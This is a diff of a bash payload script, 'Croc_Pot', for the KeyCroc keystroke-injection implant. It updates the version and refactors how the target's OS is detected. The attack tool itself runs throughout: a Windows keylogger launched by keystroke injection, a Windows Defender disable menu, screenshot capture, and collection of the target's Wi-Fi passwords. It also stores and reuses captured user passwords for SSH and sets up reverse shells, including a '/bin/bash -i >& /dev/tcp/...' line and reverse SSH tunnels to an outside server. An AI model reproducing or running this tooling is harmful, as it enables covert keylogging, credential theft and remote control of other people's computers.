@@ -1,32 +1,27 @@
 #!/bin/bash
-
+#
 ##
 # Title:         Croc_Pot
 # Description:   Email KeyCroc INFO & Log files & Nmap scan Plus save to loot folder and more
 # Author:        Spywill
-# Version:       1.4.2
+# Version:       1.4.4
 # Category:      Key Croc
 ##
 ##
 #----Payload  Variables
 ##
-CROC_FOLDER=/root/udisk/loot/Croc_Pot
-CROC_FOLDER_A=/root/udisk/tools/Croc_Pot
 DATE=$(date +%b-%d-%y---%r)
 LINE=$(perl -e 'print "=" x 80,"\n"')
 LINE_=$(perl -e 'print "*" x 10,"\n"')
 LINE_A=$(perl -e 'print "-" x 15,"\n"')
 ##
-#----Create folder
+#----Create Croc_Pot folders
 ##
-if [[ -d "${CROC_FOLDER}" && "${CROC_FOLDER_A}" ]]; then
-	LED B
+if [[ -d "/root/udisk/loot/Croc_Pot" && "/root/udisk/tools/Croc_Pot" ]]; then
 	sleep 1
 else
-	LED SETUP
 	sleep 1
-	mkdir -p ${CROC_FOLDER} ${CROC_FOLDER_A}
-	LED FINISH
+	mkdir -p /root/udisk/loot/Croc_Pot /root/udisk/tools/Croc_Pot
 fi
 ##
 #----Color  Variables
@@ -42,16 +37,16 @@ clear='\e[0m'
 #----Color Functions
 ##
 ColorGreen() {
-	echo -ne $green$1$clear
+	echo -ne ${green}${1}${clear}
 }
 ColorBlue() {
-	echo -ne $background$blue$1$clear
+	echo -ne ${background}${blue}${1}${clear}
 }
 ColorYellow() {
-	echo -ne $yellow$1$clear
+	echo -ne ${yellow}${1}${clear}
 }
 ColorRed() {
-	echo -ne $red$1$clear
+	echo -ne ${red}${1}${clear}
 }
 ##
 #----All Menu color Functions
@@ -68,15 +63,15 @@ MenuEnd() {
 }
 Info_Screen() {
 	echo -ne "\n\e[48;5;202;30m${LINE}${clear}\n"
-	echo -ne $background$yellow${*}$clear
+	echo -ne ${background}${yellow}${*}${clear}
 	echo -ne "\e[48;5;202;30m${LINE}${clear}\n"
 }
 ##
-#----Payload Functions
+#----test internet connection
 ##
 function croc_title() {
 	
-enternet_test() {
+internet_test() {
 	ping -q -c1 -w1 "8.8.8.8" &>"/dev/null"
 if [[ "${?}" -ne 0 ]]; then
 	echo "${red}Offline"
@@ -84,11 +79,14 @@ elif [[ "${#args[@]}" -eq 0 ]]; then
 	echo -ne "${green}Online "
 fi
 }
+##
+#----keycroc display info
+##
 	echo -ne "\n\n\e[41;38;5;232m${LINE}${clear}
-\e[40;31m${LINE_A}${clear}\e[40m»${clear}\e[40;31mKEYCROC${clear}\e[40m-${clear}\e[40;31mHAK${clear}\e[40m❺ ${clear}\e[40m«${clear}\e[40;31m---------${clear}\e[41;38;5;232m♁${clear}\e[40m${yellow} $(hostname) IP: $(ifconfig wlan0 | grep "inet addr" | awk {'print $2'} | cut -c 6-) $(enternet_test)         ${clear}
-\e[40;31m   DEVELOPED BY ${clear}\e[40mSPYWILL ${clear}\e[40m               ${clear}\e[41;38;5;232m§${clear}\e[40m${yellow} $(hostname) VER: $(cat /root/udisk/version.txt)                      ${clear}
+\e[40;31m${LINE_A}${clear}\e[40m»${clear}\e[40;31mKEYCROC${clear}\e[40m-${clear}\e[40;31mHAK${clear}\e[40m❺ ${clear}\e[40m«${clear}\e[40;31m---------${clear}\e[41;38;5;232m♁${clear}\e[40m${yellow} $(hostname) IP: $(ifconfig wlan0 | grep "inet addr" | awk {'print $2'} | cut -c 6-)       $(internet_test)   ${clear}
+\e[40;31m   DEVELOPED BY ${clear}\e[40mSPYWILL ${clear}\e[40m               ${clear}\e[41;38;5;232m§${clear}\e[40m${yellow} $(hostname) VER: $(cat /root/udisk/version.txt)   TARGET-PC:${green}$(OS_CHECK)  ${clear}
 \e[40;31m   DATE OF SCAN${clear}\e[40m ${DATE}${clear}\e[41;38;5;232mΩ${clear}\e[40m${yellow} $(hostname) keyboard: $(sed -n 9p /root/udisk/config.txt)           ${clear}
-\e[40;31m${LINE_A}${clear}\e[40;92m»CROC_POT«\e[40;31m--${clear}\e[40m${yellow}VER:1.4.2\e[40;31m---${clear}\e[41;38;5;232mᛝ${clear}\e[40m${yellow} CPU TEMP:$(cat /sys/class/thermal/thermal_zone0/temp)°C USAGE:$(top -bn1 | grep "Cpu(s)" | sed "s/.*, *\([0-9.]*\)%* id.*/\1/" | awk '{print 100 - $1"%"}') MEM:$(free -m | awk 'NR==2{printf "%.2f%%", $3/$2*100 }')   ${clear}
+\e[40;31m${LINE_A}${clear}\e[40;92m»CROC_POT«\e[40;31m--${clear}\e[40m${yellow}VER:1.4.4\e[40;31m---${clear}\e[41;38;5;232mᛝ${clear}\e[40m${yellow} CPU TEMP:$(cat /sys/class/thermal/thermal_zone0/temp)°C USAGE:$(top -bn1 | grep "Cpu(s)" | sed "s/.*, *\([0-9.]*\)%* id.*/\1/" | awk '{print 100 - $1"%"}') MEM:$(free -m | awk 'NR==2{printf "%.2f%%", $3/$2*100 }')   ${clear}
 \e[41;38;5;232m${LINE}${clear}\n\n"	
 }
 function croc_title_loot() {
@@ -101,6 +99,30 @@ function invalid_entry() {
 function read_all() {
 	unset r_a
 	echo -ne "\e[40;34m${*}:${clear}"; read r_a
+}
+##
+#----check OS keycroc is pluged into
+##
+OS_CHECK() {
+if [ "$(sed -n 1p /root/udisk/tools/Croc_Pot/Croc_OS.txt)" = WINDOWS ]; then
+	echo "WINDOWS"
+else
+if [ "$(sed -n 1p /root/udisk/tools/Croc_Pot/Croc_OS.txt)" = LINUX ]; then
+	echo "LINUX"
+fi
+fi
+}
+##
+#----Get target PC ip
+##
+os_ip() {
+if [ "$(OS_CHECK)" = WINDOWS ]; then
+	echo -ne "$(sed -n 2p /root/udisk/tools/Croc_Pot/Croc_OS_Target.txt)"
+else
+if [ "$(OS_CHECK)" = LINUX ]; then
+	echo -ne "$(sed -n 2p /root/udisk/tools/Croc_Pot/Croc_OS_Target.txt)"
+fi
+fi
 }
 ##
 #----Nmap mean
@@ -191,13 +213,11 @@ personal_scan() {
 #----Nmap Connected Pc Scan Functions
 ##
 pc_scan() {
-	local CROC_OS_WIND=/root/udisk/loot/Croc_OS_wind.txt
-	local croc_os_v=/root/udisk/loot/Croc_OS_ip.txt
-if [ -e "${CROC_OS_WIND}" ]; then
-	croc_title_loot | tee ${LOOT_NMAP} ; echo -e "\t${LINE_}CONNECTED PC SCAN${LINE_}\n" | tee -a ${LOOT_NMAP} ; nmap $(sed -n 4p ${CROC_OS_WIND}) | tee -a ${LOOT_NMAP}
+if [ "$(OS_CHECK)" = WINDOWS ]; then
+	croc_title_loot | tee ${LOOT_NMAP} ; echo -e "\t${LINE_}CONNECTED PC SCAN: $(OS_CHECK)${LINE_}\n" | tee -a ${LOOT_NMAP} ; nmap $(os_ip) | tee -a ${LOOT_NMAP}
 else
-if [ -e "${croc_os_v}" ]; then
-	croc_title_loot | tee ${LOOT_NMAP} ; echo -e "\t${LINE_}CONNECTED PC SCAN${LINE_}\n" | tee -a ${LOOT_NMAP} ; nmap $(sed -n 2p ${croc_os_v}) | tee -a ${LOOT_NMAP}
+if [ "$(OS_CHECK)" = LINUX ]; then
+	croc_title_loot | tee ${LOOT_NMAP} ; echo -e "\t${LINE_}CONNECTED PC SCAN: $(OS_CHECK)${LINE_}\n" | tee -a ${LOOT_NMAP} ; nmap $(os_ip) | tee -a ${LOOT_NMAP}
 else
 	echo -ne "\n\t\e[40m$(ColorRed 'PLEASE RUN CROC_POT PAYLOAD TO GET PC USER NAME AND IP')${clear}\n"
 fi
@@ -617,15 +637,13 @@ MenuEnd
 #----Windows laptop keystorkes Function
 ##
 keystorkes_laptop() {
-	local CROC_OS=/root/udisk/loot/Croc_OS.txt
-	local OS_CHECK=$(sed -n 1p ${CROC_OS})
 	echo -ne "\n${yellow}KeyCroc is pluged into OS${clear} --> $OS_CHECK\n"
 	echo -ne "$(Info_Screen '
 -With this payload you can log Keystorkes from windows laptop pc\n
 -May need to disenable windows defender for this to work\n
 -TO STOP THE PAYLOAD PRESS Ctrl + c\n
 -When stop this will open up notepad and save to loot/Croc_Pot\n')${clear}\n"
-if [ "${OS_CHECK}" = WINDOWS ]; then
+if [ "$(OS_CHECK)" = WINDOWS ]; then
 	ATTACKMODE HID STORAGE
 	sleep 5
 	Q GUI r
@@ -744,7 +762,7 @@ if [ "${OS_CHECK}" = WINDOWS ]; then
 	Q ENTER
 	LED ATTACK
 else
-	echo -ne "\n${LINE_}\e[40;4;5m$(ColorRed '--The KeyCroc is not pluged into Windows pc This Payload will not work on this OS')${LINE_}-->${clear}${OS_CHECK}\n"
+	echo -ne "\n\e[40;4;5m$(ColorRed '--The KeyCroc is not pluged into Windows pc This Payload will not work on this OS')-->${clear}$(OS_CHECK)\n"
 fi
 }
 ##
@@ -874,10 +892,8 @@ start_win_stat() {
 	local LOOT_WIND=/root/udisk/loot/Croc_Pot/KeyCroc_Wind_LOG.txt
 	local WIN_PS=/root/udisk/tools/Croc_Pot/run.ps1
 	local WIN_PS_A=/root/udisk/tools/Croc_Pot/info.ps1
-	local CROC_OS=/root/udisk/loot/Croc_OS.txt
-	local OS_CHECK=$(sed -n 1p ${CROC_OS})
-	echo -ne "\n${yellow}KeyCroc is pluged into OS${clear} --> $OS_CHECK\n"
-if [ "${OS_CHECK}" = WINDOWS ]; then
+	echo -ne "\n${yellow}KeyCroc is pluged into OS${clear} --> $(OS_CHECK)\n"
+if [ "$(OS_CHECK)" = WINDOWS ]; then
 if [[ -e "${WIN_PS}" && "${WIN_PS_A}" ]]; then
 	start_win_stat | tee ${LOOT_WIND}
 else
@@ -909,7 +925,7 @@ computerCpu, computerMainboard,computerRamCapacity,\ncomputerRam,driveType,Hdds,
 	start_win_stat | tee ${LOOT_WIND}
 fi
 else
-	echo -ne "\n${LINE_}\e[40;4;5m$(ColorRed '--The KeyCroc is not pluged into Windows pc This Payload will not work on this OS')${LINE_} -->${clear} ${OS_CHECK}\n"
+	echo -ne "\n\e[40;4;5m$(ColorRed '--The KeyCroc is not pluged into Windows pc This Payload will not work on this OS')-->${clear} $(OS_CHECK)\n"
 fi
 cat ${LOOT_WIND}
 }
@@ -3553,9 +3569,7 @@ defender_disenable() {
 ##
 #----Windows defender Menu
 ##
-	local CROC_OS=/root/udisk/loot/Croc_OS.txt
-	local OS_CHECK=$(sed -n 1p ${CROC_OS})
-if [ "${OS_CHECK}" = WINDOWS ]; then
+if [ "$(OS_CHECK)" = WINDOWS ]; then
 MenuTitle WINDOWS DEFENDER
 MenuColor 1 ENABLE WINDOWS DEFENDER ; echo -ne "   ${clear}\n"
 MenuColor 2 DISENABLE WINDOWS DEFENDER ; echo -ne "${clear}\n"
@@ -3571,7 +3585,7 @@ MenuEnd
 	*) invalid_entry ;;
 	esac
 else
-	echo -ne "\n${LINE_}\e[40;4;5m$(ColorRed '--The KeyCroc is not pluged into Windows pc This will not work on this OS')${LINE_}-->${clear}${OS_CHECK}\n"
+	echo -ne "\n\e[40;4;5m$(ColorRed '--The KeyCroc is not pluged into Windows pc This will not work on this OS')-->${clear}$(OS_CHECK)\n"
 fi
 }
 ##
@@ -3627,10 +3641,8 @@ read_all TAKE SCREENSHOT NOW Y/N AND PRESS [ENTER]
 case $r_a in
 	[yY] | [yY][eE][sS])
 	ATTACKMODE HID STORAGE
-	local CROC_OS=/root/udisk/loot/Croc_OS.txt
 	local WINDS_SHOT=/root/udisk/tools/Croc_Pot/winds_shot.ps1
-	local OS_CHECK=$(sed -n 1p ${CROC_OS})
-	if [ "${OS_CHECK}" = WINDOWS ]; then
+	if [ "$(OS_CHECK)" = WINDOWS ]; then
 	if [ -e "${WINDS_SHOT}" ]; then
 	Q GUI r
 	sleep 1
@@ -3669,7 +3681,7 @@ Add-Type -AssemblyName System.Windows.Forms\nAdd-type -AssemblyName System.Drawi
 	ATTACKMODE HID
 fi
 else
-	local HOST_CHECK=$(sed -n 3p ${CROC_OS})
+	local HOST_CHECK=$(sed -n 3p /root/udisk/loot/Croc_OS.txt)
 	case $HOST_CHECK in
 	raspberrypi)
 		Q ALT-F4
@@ -3826,27 +3838,25 @@ cat ${LOOT_INFO}
 #----Status connected pc info
 ##
 pc_info() {
-	local CROC_OS=/root/udisk/loot/Croc_OS.txt
-	local OS_CHECK=$(sed -n 1p ${CROC_OS})
-if [ "${OS_CHECK}" = WINDOWS ]; then
-	local CROC_OS_WIND=/root/udisk/loot/Croc_OS_wind.txt
-echo -ne "\n$(ColorYellow 'KeyCroc is pluged into:') $(sed -n 1p ${CROC_OS})
+	local CROC_OS=/root/udisk/tools/Croc_Pot/Croc_OS.txt
+	local CROC_OS_TARGET=/root/udisk/tools/Croc_Pot/Croc_OS_Target.txt
+if [ "$(OS_CHECK)" = WINDOWS ]; then
+echo -ne "\n$(ColorYellow 'KeyCroc is pluged into:') $(OS_CHECK)
 $(ColorYellow 'PC Host name is:') $(sed -n 3p ${CROC_OS})
 $(ColorYellow 'KeyCroc eth0 IP is:') $(sed -n 2p ${CROC_OS})
-$(ColorYellow 'Pc user name is:') $(sed -n 1p ${CROC_OS_WIND})
-$(ColorYellow 'Pc IP is:') $(sed '2,6!d' ${CROC_OS_WIND})
+$(ColorYellow 'Pc user name is:') $(sed -n 1p ${CROC_OS_TARGET})
+$(ColorYellow 'Pc IP is:') $(sed '2,6!d' ${CROC_OS_TARGET})
 $(ColorYellow 'Pc SSID + PASSWD and MAC address is:')
-$(sed '9,24!d' ${CROC_OS_WIND})\n"
+$(sed '9,24!d' ${CROC_OS_TARGET})\n"
 else
-if [ "${OS_CHECK}" = LINUX ]; then
-	local croc_os_v=/root/udisk/loot/Croc_OS_ip.txt
-echo -ne "\n$(ColorYellow 'KeyCroc is pluged into:') $(sed -n 1p ${CROC_OS})
+if [ "$(OS_CHECK)" = LINUX ]; then
+echo -ne "\n$(ColorYellow 'KeyCroc is pluged into:') $(OS_CHECK)
 $(ColorYellow 'PC Host name is:') $(sed -n 3p ${CROC_OS})
 $(ColorYellow 'KeyCroc eth0 IP is:') $(sed -n 2p ${CROC_OS})
-$(ColorYellow 'Pc user name is:') $(sed -n 1p ${croc_os_v})
-$(ColorYellow 'Pc IP is:') $(sed -n '2,3p' ${croc_os_v})
+$(ColorYellow 'Pc user name is:') $(sed -n 1p ${CROC_OS_TARGET})
+$(ColorYellow 'Pc IP is:') $(sed -n '2,3p' ${CROC_OS_TARGET})
 $(ColorYellow 'Pc SSID + PASSWD and MAC address is:') 
-$(sed '4,20!d' ${croc_os_v})\n"
+$(sed '4,20!d' ${CROC_OS_TARGET})\n"
 else
 	echo -ne "$(ColorRed 'PLEASE RUN CROC_POT PAYLOAD TO GET PC USER NAME AND IP')"
 fi
@@ -4126,26 +4136,10 @@ function ssh_menu() {
 #----SSH check devices for connection
 ##
 check_device() {
-if ping -q -c1 -w1 ${1} >/dev/null 2>&1; then
+if ping -q -c1 -w1 ${1} &>/dev/null 2>&1; then
 	echo -ne "\e[40;93m${2} ${3} ${clear}\e[40;32mCONNECTED IP:${1} ${clear}${4} ${5}" >&2
 else
 	echo -ne "\e[40;93m${2} ${3} ${clear}\e[40;31mNOT CONNECTED OR CAN'T BE REACHED ${clear}" >&2
-fi
-}
-##
-#----SSH get PC ip from Croc_Pot_Payload
-##
-os_connect() {
-	local CROC_OS=/root/udisk/loot/Croc_OS.txt
-	local OS_CHECK=$(sed -n 1p ${CROC_OS})
-if [ "${OS_CHECK}" = WINDOWS ]; then
-	local CROC_OS_WIND=/root/udisk/loot/Croc_OS_wind.txt
-	echo "$(sed -n 2p ${CROC_OS_WIND})"
-else
-if [ "${OS_CHECK}" = LINUX ]; then
-	local CROC_OS_V=/root/udisk/loot/Croc_OS_ip.txt
-	echo "$(sed -n 2p ${CROC_OS_V})"
-fi
 fi
 }
 ##
@@ -4163,29 +4157,30 @@ fi
 #----SSH owl get ip from mac
 ##
 owl_check() {
-	local OWL_IP=$(arp -a | sed -ne '/00:00:00:00:00:00/p' | sed -e 's/.*(\(.*\)).*/\1/')  #place Owl mac here
+	local OWL_IP=$(arp -a | sed -ne '/00:c0:ca:aa:99:a3/p' | sed -e 's/.*(\(.*\)).*/\1/')  #place Owl mac here
 if [[ "${OWL_IP}" == +([0-9]).+([0-9]).+([0-9]).+([0-9]) ]]; then
 	IP_O=${OWL_IP}
 else
 	IP_O=172.16.56.1
 fi
 }
-p_ip() {
+public_ip() {
 	echo -ne "\e[40;93mPublic ip:${clear}\e[40;32m$(curl -s https://api.ipify.org) ${clear}"
 }
 ##
 #----SSH check port 22 open or closed
 ##
 port_check() {
-for PORT in 22; do
-	timeout 1 bash -c "</dev/tcp/${1}/$PORT &>/dev/null"
-if [ "$?" -ne 0 ]; then
+nc -z -v -w1 ${1} 22 &>/dev/null 2>&1
+if [[ "$?" -ne 0 ]]; then
 	echo -ne "\e[40;93m Port:${clear}\e[40;31m$PORT closed${clear}\n"
-else
+elif [[ "${#args[@]}" -eq 0 ]]; then
 	echo -ne "\e[40;93m Port:${clear}\e[40;32m$PORT open${clear}\n"
 fi
-done
 }
+##
+#----SSH get mac addresses
+##
 get_mac () {
 	echo -ne "\e[40;93mMAC: ${clear}"
 }
@@ -4194,21 +4189,20 @@ get_mac () {
 -SSH into connect PC\n
 -Reverse ssh tunnel\n
 -Ensure your devices are connected to the same local network As keycroc\n')${clear}\n"
-check_device $(os_connect) CONNECTED PC: $(p_ip) ; port_check $(os_connect)
+check_device $(os_ip) CONNECTED PC: $(public_ip) ; port_check $(os_ip)
 check_device 172.16.42.1 WIFI PINEAPPLE: $(get_mac) ; port_check 172.16.42.1
 check_device 172.16.32.1 SQUIRREL : $(get_mac) ; port_check 172.16.32.1
 check_device 172.16.84.1 TURTLE : $(get_mac) ; port_check 172.16.84.1
 shark_check ; check_device ${IP_F} SHARK JACK: $(get_mac) ; port_check ${IP_F}
-owl_check ; check_device ${IP_O} OWL : $(get_mac) ; port_check ${IP_O}
-check_device 172.16.64.1 BASH BUNNY: $(get_mac) ; port_check 172.16.64.1
+#owl_check ; check_device ${IP_O} OWL : $(get_mac) ; port_check ${IP_O}
+#check_device 172.16.64.1 BASH BUNNY: $(get_mac) ; port_check 172.16.64.1
 echo -ne "\e[48;5;202;30m${LINE}${clear}\n"
 ##
 #----SSH check for pc passwd
 ##
 pc_pw() {
-	local pw_check=/root/udisk/loot/Croc_Pot/winpasswd.txt
-if [ -e "${pw_check}" ]; then
-	echo -ne "$(ColorYellow 'Have An save Passwd we will try this:') $(sed '$!d' ${pw_check})\n"
+if [ -e "/root/udisk/loot/Croc_Pot/winpasswd.txt" ]; then
+	echo -ne "$(ColorYellow 'Have An save Passwd try this:') $(sed '$!d' /root/udisk/loot/Croc_Pot/winpasswd.txt)\n"
 else
 	echo -ne "\e[40;4;5m$(ColorRed 'Run Croc_Unlock Payload to get user passwd')${clear}\n"
 fi
@@ -4217,44 +4211,33 @@ fi
 #----SSH to connected pc
 ##
 pc_ssh() {
-	local CROC_OS=/root/udisk/loot/Croc_OS.txt
-	local OS_CHECK=$(sed -n 1p ${CROC_OS})
-	local pw_check=/root/udisk/loot/Croc_Pot/winpasswd.txt
 	pc_pw
-	case $OS_CHECK in
+	case $(OS_CHECK) in
 	WINDOWS)
-		local CROC_OS_WIND=/root/udisk/loot/Croc_OS_wind.txt
-		if [ -e "${pw_check}" ]; then
-	echo -ne "\t$(ColorYellow 'The PC user name is:') $(sed -n 1p ${CROC_OS_WIND})
-\t$(ColorYellow 'The PC IP is:') $(sed -n 2p ${CROC_OS_WIND})
+		if [ -e "/root/udisk/loot/Croc_Pot/winpasswd.txt" ]; then
+	echo -ne "\t$(ColorYellow 'The PC user name is:') $(sed -n 1p /root/udisk/tools/Croc_Pot/Croc_OS_Target.txt)
+\t$(ColorYellow 'The PC IP is:') $(os_ip)
 \t$(ColorGreen 'Starting SSH with connected PC')\n"
-	ssh $(sed -n 1p ${CROC_OS_WIND})@$(sed -n 2p ${CROC_OS_WIND})
-	sleep 2
-	Q STRING "$(sed '$!d' ${pw_check})"
-	Q ENTER
+	ssh $(sed -n 1p /root/udisk/tools/Croc_Pot/Croc_OS_Target.txt)@$(os_ip)
 		else
-	echo -ne "\t$(ColorYellow 'The PC user name is:') $(sed -n 1p ${CROC_OS_WIND})
-\t$(ColorYellow 'The PC IP is:') $(sed -n 2p ${CROC_OS_WIND})
+	echo -ne "\t$(ColorYellow 'The PC user name is:') $(sed -n 1p /root/udisk/tools/Croc_Pot/Croc_OS_Target.txt)
+\t$(ColorYellow 'The PC IP is:') $(os_ip)
 \t$(ColorGreen 'Starting SSH with connected PC')
 \t$(ColorYellow 'ENTER PASSWD MANUALLY')\n"
-	ssh $(sed -n 1p ${CROC_OS_WIND})@$(sed -n 2p ${CROC_OS_WIND})
+	ssh $(sed -n 1p /root/udisk/tools/Croc_Pot/Croc_OS_Target.txt)@$(os_ip)
 		fi ;;
 	LINUX)
-		local CROC_OS_V=/root/udisk/loot/Croc_OS_ip.txt
-		if [ -e "${pw_check}" ]; then
-	echo -ne "\t$(ColorYellow 'The PC user name is:') $(sed -n 1p ${CROC_OS_V})
-\t$(ColorYellow 'The PC IP is:') $(sed -n 2p ${CROC_OS_V})
+		if [ -e "/root/udisk/loot/Croc_Pot/winpasswd.txt" ]; then
+	echo -ne "\t$(ColorYellow 'The PC user name is:') $(sed -n 1p /root/udisk/tools/Croc_Pot/Croc_OS_Target.txt)
+\t$(ColorYellow 'The PC IP is:') $(os_ip)
 \t$(ColorGreen 'Starting SSH with connected PC')\n"
-	ssh $(sed -n 1p ${CROC_OS_V})@$(sed -n 2p ${CROC_OS_V})
-	sleep 2
-	Q STRING "$(sed '$!d' ${pw_check})"
-	Q ENTER
+	ssh $(sed -n 1p /root/udisk/tools/Croc_Pot/Croc_OS_Target.txt)@$(os_ip)
 		else
-	echo -ne "\t$(ColorYellow 'The PC user name is:') $(sed -n 1p ${CROC_OS_V})
-\t$(ColorYellow 'The PC IP is:') $(sed -n 2p ${CROC_OS_V})
+	echo -ne "\t$(ColorYellow 'The PC user name is:') $(sed -n 1p /root/udisk/tools/Croc_Pot/Croc_OS_Target.txt)
+\t$(ColorYellow 'The PC IP is:') $(os_ip)
 \t$(ColorGreen 'Starting SSH with connected PC')
 \t$(ColorYellow 'ENTER PASSWD MANUALLY')\n"
-	ssh $(sed -n 1p ${CROC_OS_V})@$(sed -n 2p ${CROC_OS_V})
+	ssh $(sed -n 1p /root/udisk/tools/Croc_Pot/Croc_OS_Target.txt)@$(os_ip)
 		fi ;;
 	MACOS)
 		echo -ne "\t$(ColorRed 'SORRY NO SUPPORT AT THIS TIME FOR MAC USERS')\n" ;;
@@ -4286,9 +4269,7 @@ fi
 ##
 pine_web() {
 	echo -ne "\n\e[40m$(ColorYellow 'Starting WIFI Pineapple web page')\n${clear}"
-	local CROC_OS=/root/udisk/loot/Croc_OS.txt
-	local OS_CHECK=$(sed -n 1p ${CROC_OS})
-if [ "${OS_CHECK}" = WINDOWS ]; then
+if [ "$(OS_CHECK)" = WINDOWS ]; then
 	Q GUI d
 	Q GUI r
 	sleep 1
@@ -4303,7 +4284,7 @@ if [ "${OS_CHECK}" = WINDOWS ]; then
 	Q STRING "exit"
 	Q ENTER
 else
-	local HOST_CHECK=$(sed -n 3p ${CROC_OS})
+	local HOST_CHECK=$(sed -n 3p /root/udisk/loot/Croc_OS.txt)
 	case $HOST_CHECK in
 	raspberrypi)
 		Q GUI d
@@ -4454,9 +4435,7 @@ fi
 	read_all START SSH WITH CONNECTED PC TO BUNNY Y/N AND PRESS [ENTER]
 	case $r_a in
 	[yY] | [yY][eE][sS])
-		local CROC_OS=/root/udisk/loot/Croc_OS.txt
-		local OS_CHECK=$(sed -n 1p ${CROC_OS})
-if [ "${OS_CHECK}" = WINDOWS ]; then
+if [ "$(OS_CHECK)" = WINDOWS ]; then
 		Q GUI d
 		Q GUI r
 		sleep 1
@@ -4466,7 +4445,7 @@ if [ "${OS_CHECK}" = WINDOWS ]; then
 		Q STRING "ssh root@172.16.64.1"
 		Q ENTER
 else
-	local HOST_CHECK=$(sed -n 3p ${CROC_OS})
+	local HOST_CHECK=$(sed -n 3p /root/udisk/loot/Croc_OS.txt)
 	case $HOST_CHECK in
 	raspberrypi)
 		Q GUI d
@@ -4587,16 +4566,18 @@ shell_input() {
 	echo -ne "\e[40m$(ColorBlue 'ENTER PORT NUMBER TO USE PRESS [ENTER]:')${clear}"; read IP_RSP
 }
 ##
-#----SSH reverse remote listener (server)
+#----SSH reverse with nc remote listener (server)
 ##
 remote_listener() {
 	clear
 	echo -ne "$(Info_Screen '
--Start a reverse shell on your keycroc\n
+-Start a reverse shell with nc on your keycroc\n
 -Remotely access your keycroc from your server\n
--Frist On the listening server enter this below\n
---> \e[40;32mnc -lnvp PORT# -s IP OF LISTENING SERVER\e[0m\e[40;93m <--\n
--On Keycroc Enter ip of the listening server and port number\n')${clear}\n\n"
+-Frist On the listening remote-server enter this below\n
+-\e[40;32mnc -lnvp PORT# -s IP OF LISTENING REMOTE-SERVER\e[0m\e[40;93m\n
+-On Keycroc Enter ip of the listening remote-server and port number\n
+-Keycroc side will be setup as below\n
+-\e[40;32m/bin/bash -i >& /dev/tcp/remote-server-ip/port#\n')${clear}\n\n"
 	read_all START REVERSE SHELL Y/N AND PRESS [ENTER]
 	case $r_a in
 	[yY] | [yY][eE][sS])
@@ -4655,12 +4636,12 @@ croc_listener() {
 reverse_payload() {
 	clear
 	echo -ne "$(Info_Screen '
--Create payload Reverse SSH Tunnel keycroc to your server\n
--Just by typing croctunnel\n
+-Create Reverse SSH Tunnel Payload keycroc to your server\n
+-Plug keycroc into pc and type in croctunnel\n
 -Keycroc side will be setup as below\n
--ssh -fN -R port#:localhost:22 username@your-server-ip\n
--Enter on server side as below
--ssh root@localhost -p port#\n')${clear}\n\n"
+-\e[40;32mssh -fN -R port#:localhost:22 username@your-server-ip\e[0m\e[40;93m\n
+-Enter on server side as below\n
+-\e[40;32mssh root@localhost -p port#\n')${clear}\n\n"
 	local PAYLOAD_SHELL=/root/udisk/payloads/Croc_Shell.txt
 	if [ -e "${PAYLOAD_SHELL}" ]; then
 		echo -ne "\n\e[40m$(ColorGreen 'Croc_Shell already exists')\n${clear}"
@@ -4697,15 +4678,13 @@ shell_pc() {
 	echo -ne "$(Info_Screen '
 -Start reverse ssh tunnel PC to Keycroc\n
 -PC side will be setup with this below\n
--\e[40;32mssh -fN -R 7000:localhost:22 root@keycroc IP\e[0m\n
-\e[93m-Keycroc side will be setup with this below\e[0m\n
+-\e[40;32mssh -fN -R 7000:localhost:22 root@keycroc IP\e[0m\e[40;93m\n
+-Keycroc side will be setup with this below\n
 -\e[40;32mssh PC-username@localhost -p 7000\e[0m\n')${clear}\n\n"
 	read_all START REVERSE SSH TUNNEL PC TO KEYCROC Y/N AND PRESS [ENTER]
 	case $r_a in
 	[yY] | [yY][eE][sS])
-		local CROC_OS=/root/udisk/loot/Croc_OS.txt
-		local OS_CHECK=$(sed -n 1p ${CROC_OS})
-	if [ "${OS_CHECK}" = WINDOWS ]; then
+	if [ "$(OS_CHECK)" = WINDOWS ]; then
 		Q GUI d
 		Q GUI r
 		sleep 1
@@ -4718,9 +4697,9 @@ shell_pc() {
 		Q STRING "exit"
 		Q ENTER
 		Q ALT-TAB
-		ssh $(sed -n 1p /root/udisk/loot/Croc_OS_wind.txt)@localhost -p 7000
+		ssh $(sed -n 1p /root/udisk/tools/Croc_Pot/Croc_OS_Target.txt)@localhost -p 7000
 else
-		local HOST_CHECK=$(sed -n 3p ${CROC_OS})
+		local HOST_CHECK=$(sed -n 3p /root/udisk/tools/Croc_Pot/Croc_OS_Target.txt)
 	case $HOST_CHECK in
 		raspberrypi)
 		Q GUI d
@@ -4735,7 +4714,7 @@ else
 		Q STRING "exit"
 		Q ENTER
 		Q ALT-TAB
-		ssh $(sed -n 1p /root/udisk/loot/Croc_OS_ip.txt)@localhost -p 7000 ;;
+		ssh $(sed -n 1p /root/udisk/tools/Croc_Pot/Croc_OS_Target.txt)@localhost -p 7000 ;;
 	parrot)
 		Q ALT F2
 		sleep 1
@@ -4748,7 +4727,7 @@ else
 		Q STRING "exit"
 		Q ENTER
 		Q ALT-TAB
-		ssh $(sed -n 1p /root/udisk/loot/Croc_OS_ip.txt)@localhost -p 7000 ;;
+		ssh $(sed -n 1p /root/udisk/tools/Croc_Pot/Croc_OS_Target.txt)@localhost -p 7000 ;;
 	*)
 		Q ALT F2
 		sleep 1
@@ -4761,7 +4740,7 @@ else
 		Q STRING "exit"
 		Q ENTER
 		Q ALT-TAB
-		ssh $(sed -n 1p /root/udisk/loot/Croc_OS_ip.txt)@localhost -p 7000 ;;
+		ssh $(sed -n 1p /root/udisk/tools/Croc_Pot/Croc_OS_Target.txt)@localhost -p 7000 ;;
 	esac
 fi ;;
 	[nN] | [nN][oO])
@@ -4776,10 +4755,11 @@ esac
 ssh_tunnel() {
 	echo -ne "$(Info_Screen '
 -Start a Reverse SSH Tunnel Keycroc to server\n
+-Remotely access your keycroc from your server\n
 -Keycroc will be setup with these setting below\n
--ssh -fN -R port#:localhost:22 root@your-server-ip\n
+-\e[40;32mssh -fN -R port#:localhost:22 root@your-server-ip\e[0m\e[40;93m\n
 -ON your server enter this below\n 
--ssh root@localhost -p port#\n')${clear}\n"
+-\e[40;32mssh root@localhost -p port#\n')${clear}\n"
 	read_all START REVERSE SSH TUNNEL Y/N AND PRESS [ENTER]
 	case $r_a in
 	[yY] | [yY][eE][sS])
@@ -4854,7 +4834,7 @@ MenuColor 8 SIGNAL OWL ; echo -ne "               ${clear}\n"
 MenuColor 9 SHARK JACK ; echo -ne "               ${clear}\n"
 MenuColor 10 BASH BUNNY ; echo -ne "              ${clear}\n"
